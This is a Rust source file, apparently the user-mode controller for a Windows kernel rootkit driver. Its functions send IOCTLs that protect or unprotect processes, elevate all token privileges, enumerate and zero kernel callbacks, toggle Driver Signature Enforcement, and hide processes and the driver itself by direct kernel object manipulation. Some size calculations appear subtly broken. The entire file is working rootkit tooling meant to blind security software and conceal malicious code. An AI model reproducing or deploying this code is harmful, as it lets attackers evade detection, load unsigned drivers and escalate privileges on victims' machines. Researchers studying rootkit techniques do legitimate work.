use std::{mem::size_of, ptr::null_mut};
use winapi::{um::{ioapiset::DeviceIoControl}, ctypes::c_void};
use common::{TargetProcess, IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, CallBackInformation, TargetCallback, IOCTL_CALLBACKS_ZERO_REQUEST, IOCTL_DSE_ENABLE_DISABLE_REQUEST, DriverSignatureEnforcement, IOCTL_PROCESS_HIDE_REQUEST, IOCTL_DRIVER_HIDE_REQUEST, IOCTL_DRIVER_ENUM_REQUEST, ModuleInformation};

/// Protect a process as PsProtectedSignerWinTcb
pub fn protect_process(process_id: u32, driver_handle: *mut c_void) {
    let mut bytes: u32 = 0;
    
    let mut target_process = TargetProcess {
        process_id: process_id,
    };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_PROCESS_PROTECT_REQUEST,
        &mut target_process as *mut _ as *mut c_void,
        size_of::<TargetProcess> as u32,
        null_mut(),
        0,
        &mut bytes,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }

    println!("[+] Process protected successfully {:?}", target_process.process_id);
}

/// Remove process protection
pub fn unprotect_process(process_id: u32, driver_handle: *mut c_void) {
    let mut bytes: u32 = 0;
    
    let mut target_process = TargetProcess {
        process_id: process_id,
    };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_PROCESS_UNPROTECT_REQUEST,
        &mut target_process as *mut _ as *mut c_void,
        size_of::<TargetProcess> as u32,
        null_mut(),
        0,
        &mut bytes,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }

    println!("[+] Process unprotected successfully {:?}", target_process.process_id);
}

/// Enable / elevate all token privileges of a process
pub fn enable_tokens(process_id: u32, driver_handle: *mut c_void) {
    let mut bytes: u32 = 0;
    
    let mut target_process = TargetProcess {
        process_id: process_id,
    };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST,
        &mut target_process as *mut _ as *mut c_void,
        size_of::<TargetProcess> as u32,
        null_mut(),
        0,
        &mut bytes,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }

    println!("[+] Tokens privileges elevated successfully {:?}", target_process.process_id);
}

/// Enumerate Kernel Callbacks
pub fn enumerate_callbacks(driver_handle: *mut c_void) {
    
    let mut bytes: u32 = 0;
    let mut callbacks: [CallBackInformation; 64] = unsafe{ std::mem::zeroed() };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_CALLBACKS_ENUM_REQUEST,
        null_mut(),
        0,
        callbacks.as_mut_ptr() as *mut _,
        (callbacks.len() * size_of::<CallBackInformation>()) as u32,
        &mut bytes,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }

    let number_of_callbacks = (bytes / size_of::<CallBackInformation>() as u32) as usize;
    println!("Total Kernel Callbacks: {:?}", number_of_callbacks);

    for i in 0..number_of_callbacks {
        if callbacks[i].pointer > 0 {
            let name = std::str::from_utf8(&callbacks[i].module_name).unwrap().trim_end_matches('\0');
            println!("[{:?}] {:#x} ({:?})", i, callbacks[i].pointer, name);
        }
    }
}

/// Patch kernel callbacks
pub fn patch_callback(index: u32, driver_handle: *mut c_void) {
    let mut bytes: u32 = 0;
    
    let mut target = TargetCallback {
        index: index,
    };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_CALLBACKS_ZERO_REQUEST,
        &mut target as *mut _ as *mut c_void,
        size_of::<TargetProcess> as u32,
        null_mut(),
        0,
        &mut bytes,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }

    println!("[+] Callback patched successfully at index {:?}", target.index);
}

/// Enable Driver Signature Enforcement (DSE)
pub fn enable_or_disable_dse(driver_handle: *mut c_void, dse_state: bool) {
    let mut bytes: u32 = 0;
    
    let mut dse = DriverSignatureEnforcement {
        address: 0,
        is_enabled: true,
    };

    if dse_state {
        dse.is_enabled = true;
    } else {
        dse.is_enabled = false;
    }

    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_DSE_ENABLE_DISABLE_REQUEST,
        &mut dse as *mut _ as *mut c_void,
        size_of::<DriverSignatureEnforcement> as u32,
        &mut dse as *mut _ as *mut c_void,
        size_of::<CallBackInformation>() as u32,
        &mut bytes,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }

    println!("Bytes returned: {:?}", bytes);
    
    if dse.is_enabled {
        println!("[+] Driver Signature Enforcement (DSE) enabled: {:#x}", dse.address);
    } else {
        println!("[+] Driver Signature Enforcement (DSE) disabled: {:#x}", dse.address);
    }
}


/// Hide a process using Direct Kernel Object Manipulation (DKOM)
pub fn hide_process(process_id: u32, driver_handle: *mut c_void) {
    let mut bytes: u32 = 0;
    
    let mut target_process = TargetProcess {
        process_id: process_id,
    };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_PROCESS_HIDE_REQUEST,
        &mut target_process as *mut _ as *mut c_void,
        size_of::<TargetProcess> as u32,
        null_mut(),
        0,
        &mut bytes,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }

    println!("[+] Process is hidden successfully: {:?}", target_process.process_id);
}

/// Hide a driver using Direct Kernel Object Manipulation (DKOM)
pub fn hide_driver(driver_handle: *mut c_void) {
    let mut bytes: u32 = 0;
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_DRIVER_HIDE_REQUEST,
        null_mut(),
        0,
        null_mut(),
        0,
        &mut bytes,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }

    println!("[+] Driver hidden successfully");
}

/// Get a list of all loaded modules using PsLoadedModuleList
pub fn get_loaded_modules_list(driver_handle: *mut c_void) {
    let mut bytes: u32 = 0;
    //let mut module_information = [(); 256].map(|_| ModuleInformation::default());
    let mut module_information: [ModuleInformation; 256] = unsafe { std::mem::zeroed() };

    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_DRIVER_ENUM_REQUEST,
        null_mut(),
        0,
        module_information.as_mut_ptr() as *mut _,
        (module_information.len() * size_of::<ModuleInformation>()) as u32,
        &mut bytes,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }

    let numer_of_modules = (bytes / size_of::<ModuleInformation>() as u32) as usize;
    println!("Total Number of Modules: {:?}", numer_of_modules);

    for i in 0..numer_of_modules {
        if  module_information[i].module_base > 0 {
            let name = String::from_utf16_lossy(&module_information[i].module_name).trim_end_matches('\0').to_owned();
            println!("[{:?}] {:#x} {:?}", i, module_information[i].module_base, name);
        }
    }

    println!("[+] Loaded modules enumerated successfully");
}